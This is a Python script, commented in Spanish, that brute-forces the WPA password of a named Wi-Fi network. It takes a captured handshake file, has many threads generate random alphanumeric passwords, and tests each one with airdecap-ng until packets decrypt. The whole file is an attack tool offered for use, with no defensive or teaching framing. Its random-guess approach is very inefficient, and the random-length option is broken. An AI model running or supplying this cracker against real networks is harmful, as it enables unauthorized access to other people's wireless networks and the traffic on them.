#!/bin/python3
# Crearlo en C

# Funciona
try:
    import subprocess
    import random
    import string
    import re
    import threading
    import concurrent.futures
    import time
    from datetime import datetime
    import colorama
    from colorama import Fore
    from concurrent.futures import ThreadPoolExecutor
    from tqdm import tqdm
    colorama.init()
except ModuleNotFoundError as e:
    print("[!] Faltan Modulos...\n", e)

tries = 0
tried = []
password_found = threading.Event()


def generate_password(length):
    global tries
    length_options = [8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
    if length == "r":
        length = random.choice(length_options)

    characters = string.ascii_letters + string.digits
    password = ''.join(random.choice(characters) for _ in range(length))

    while password in tried:
        password = ''.join(random.choice(characters) for _ in range(length))

    tried.append(password)
    tries += 1
    return password, tries


def brute_force(progress_bar, file, length, network_to_attack):
    global found
    found = False
    # Intentar descifrar el handshake con diferentes contraseñas generadas
    while not password_found.is_set() and not found:

        password, num = generate_password(length)

        progress_bar.set_description(Fore.LIGHTYELLOW_EX + r"[♦] Attempt: " + Fore.LIGHTCYAN_EX + f"{num}" +
                                     Fore.LIGHTYELLOW_EX + " Password: " + Fore.LIGHTCYAN_EX + f"{password}"
                                     + Fore.RESET)

        command = subprocess.Popen(
            ["airdecap-ng", "-p", password, "-e", network_to_attack, file],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = command.communicate()[0]

        dec_pkts = re.search(r"Number of decrypted WPA  packets\s+(\d+)", output.decode())
        dec_pkts = int(dec_pkts.group(1))

        if dec_pkts > 0:
            time.sleep(3)
            print(Fore.GREEN + "\n\n\t[*] " + Fore.BLUE + "Contraseña encontrada: " +
                  Fore.LIGHTYELLOW_EX + f"{password}\n")
            print(Fore.GREEN + "\n\n\t[+] " + Fore.BLUE + "Decrypted packets: " +
                  Fore.LIGHTYELLOW_EX + f"{dec_pkts}\n")
            found = True
            password_found.set()


def startbrute(file, length, threads, network_to_attack):
    start_time = datetime.now()
    main(file, length, threads, network_to_attack)
    print(Fore.YELLOW + "\n\t\t[+] " + Fore.CYAN + "TIME ELAPSED:", datetime.now() - start_time)


def main(file, length, threads, network_to_attack):

    try:
        print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Starting brute force module ...\n" + Fore.RESET)
        time.sleep(0.5)
        print(Fore.YELLOW + "\n\t[+] " + Fore.BLUE + "Preparing threads & starting...\n" + Fore.RESET)
        time.sleep(0.5) 
        threads = int(threads)

        with ThreadPoolExecutor(max_workers=threads) as executor:
            # Lista de tareas
            futures = []
            progress_bar = tqdm(total=0)

            for i in range(threads):
                future = executor.submit(brute_force, progress_bar, file, length, network_to_attack)
                future.deamon = True
                futures.append(future)

        concurrent.futures.wait(futures)

    except KeyboardInterrupt:
        print(Fore.RED + "\n\n\n\n[*] Recived -> CTRL + C" + Fore.LIGHTYELLOW_EX + "\n\n\tStopping threads, wait in "
                                                                                   "process...\n\n")
        progress_bar.close()
        password_found.set()
        found = "Fake"

        # Cancelamos todos los hilos/tareas
        for future in futures:
            future.cancel()

        # Esperamos a todos los hilos detenidos
        concurrent.futures.wait(futures)


if __name__ == "__main__":
    start = datetime.now()
    print()
    main(file=input("Enter .cap file --> "), length=input("Enter length --> "), threads=500,
         network_to_attack=input("SSID Name -> "))
    print(Fore.YELLOW + "\n\t\t[+] " + Fore.CYAN + "TIME ELAPSED:", datetime.now() - start)